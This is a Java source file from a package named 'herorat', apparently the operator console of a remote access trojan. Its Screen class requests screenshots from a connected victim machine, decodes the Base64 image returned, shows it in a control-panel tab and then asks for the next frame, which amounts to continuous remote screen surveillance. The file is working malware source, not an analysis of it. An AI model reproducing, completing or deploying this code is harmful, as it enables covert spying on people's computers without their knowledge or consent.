package net.herorat.features.screen;

import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;

import net.herorat.Main;
import net.herorat.features.servers.Server;
import net.herorat.network.Network;
import net.herorat.network.Packet;
import net.herorat.network.Packet10Screen;
import net.herorat.utils.Base64;


public class Screen
{
	public static void send(Server server, int zoom)
	{
		Packet p = new Packet10Screen(server.outputstream, new String[] { String.valueOf(zoom) });
		p.write();
	}

	public static void handle(Server server, String[] args)
	{
		if (!server.equals(Network.findWithCombo(Main.mainWindow.panel_tab3.combo_selected_item))) return;
		
		StringBuffer buffer = new StringBuffer();
		for (String arg : args)
		{
			buffer.append(arg);
		}
		
		try
		{
			byte[] image_bytes = Base64.decode(buffer.toString());
			ByteArrayInputStream image_stream = new ByteArrayInputStream(image_bytes);
			BufferedImage image = ImageIO.read(image_stream);
			Main.mainWindow.panel_tab3.label_screen.setIcon(new ImageIcon(image.getScaledInstance(image.getWidth(), image.getHeight(), 8) ));
		}
		catch (Exception e)
		{
			e.printStackTrace();
		}
		
		Packet p = new Packet10Screen(server.outputstream, new String[] { Main.mainWindow.panel_tab3.spinner_zoom.getValue().toString() });
		p.write();
	}
}